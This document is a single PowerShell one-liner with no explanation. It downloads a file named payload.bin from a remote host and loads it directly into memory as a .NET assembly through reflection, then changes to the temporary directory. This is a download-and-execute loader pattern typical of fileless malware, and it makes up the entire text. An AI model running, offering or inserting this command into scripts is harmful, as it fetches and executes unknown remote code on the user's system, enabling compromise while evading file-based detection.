$AssemblyBytes = (New-Object System.Net.WebClient).DownloadData('https://internal.corp:443/payload.bin'); [Reflection.Assembly]::Load($AssemblyBytes); Set-Location -Path $env:TEMP
